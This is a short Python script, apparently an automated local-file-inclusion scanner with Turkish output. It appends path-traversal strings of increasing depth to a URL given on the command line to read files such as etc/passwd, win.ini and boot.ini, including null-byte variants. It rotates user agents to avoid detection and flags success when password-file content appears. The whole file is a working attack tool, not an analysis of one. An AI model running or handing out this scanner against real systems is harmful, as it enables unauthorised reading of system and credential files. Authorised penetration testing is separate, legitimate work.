import requests
import sys
import threading
import random




USER_AGENTS = [gent.strip() for gent in open(".....user-agents.txt")]
url = sys.argv[1]

class color:
    GREEN = '\033[92m'
    RED = '\033[91m'
    BLUE = '\033[94m'

def LFI(url):
        one_step_deeper = ["../", "..2f"]
        local_file = ["etc/passwd", "win.ini", "etc/passwd%00", "boot.ini%00", "boot.ini"]
        for steper in one_step_deeper:
            for file_path in local_file:
                for depth in range(25):
                    replace_string = (depth * steper) + file_path
                    x = requests.get(url + replace_string,headers={"User-Agent":random.choice(USER_AGENTS)}).text
                    print(url+replace_string)
                    if "root:x" in x:
                        print(color.RED+"*"*100)
                        print(color.RED+"LFI BULUNDU ==>" + replace_string)
                        print(color.RED+"*" * 100)
                    else:
                        pass
LFI(sys.argv[1])








